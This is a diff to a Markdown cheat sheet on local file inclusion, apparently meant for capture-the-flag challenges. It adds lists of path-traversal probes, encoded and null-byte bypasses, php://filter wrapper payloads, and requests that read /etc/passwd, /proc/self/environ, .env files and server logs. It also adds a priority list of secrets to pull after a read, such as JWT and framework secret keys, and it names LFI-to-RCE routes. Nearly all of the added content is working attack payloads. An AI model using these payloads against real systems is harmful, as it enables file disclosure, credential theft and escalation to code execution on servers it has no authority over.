@@ -1,5 +1,29 @@
 # LFI
 
+## Fast Probes
+
+```text
+../../../../flag.txt
+..././..././flag.txt
+..%2f..%2f..%2fflag.txt
+%252e%252e%252f%252e%252e%252fflag.txt
+```
+
+## Payload Bank
+
+```text
+/?file=/flag.txt
+/?file=/etc/passwd
+/?file=/proc/self/environ
+/?file=/proc/self/cmdline
+/?file=/app/.env
+/?file=/var/www/html/.env
+/?file=/var/log/nginx/access.log
+/?file=php://filter/convert.base64-encode/resource=index.php
+/?file=php://filter/convert.base64-encode/resource=/flag.txt
+/?file=php://filter/zlib.deflate/convert.base64-encode/resource=/flag.txt
+```
+
 * Basic:\
   `/etc/passwd`, `../../../../etc/passwd`
 * PHP Wrapper:\
@@ -10,11 +34,39 @@
 ## Check Php Gadget
 
 ```
-# deploy local with docker compose 
+# deploy local with docker compose
 
 # after that on the terminal container
 
 find -name "*.php"
+```
+
+## Bypass
+
+```text
+....//....//....//flag.txt
+..././..././..././flag.txt
+..%2f..%2f..%2fflag.txt
+%252e%252e%252fetc%252fpasswd
+..\..\..\flag.txt
+/var/www/images/../../../etc/passwd
+../../../etc/passwd%00.png
+```
+
+## Post-Read Priority
+
+1. App source: routes, templates, middleware, validators.
+2. Config: `.env`, `config.py`, `settings.py`, `application.yml`, `composer.json`.
+3. Secrets: Flask/Django secret, JWT secret, Rails `secret_key_base`.
+4. Runtime: `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/cwd`.
+5. Writable targets: access logs, uploads, temp folders, session files.
+
+```text
+/?file=/app/app.py
+/?file=/app/config.py
+/?file=/app/package.json
+/?file=/var/www/html/index.php
+/?file=/var/www/html/composer.json
 ```
 
 ## LFI2RCE via pearcmd / peclcmd
@@ -63,4 +115,3 @@ Adv payload, pearcmd
 Log poisoning, basics payload
 
 {% embed url="https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet" %}
-
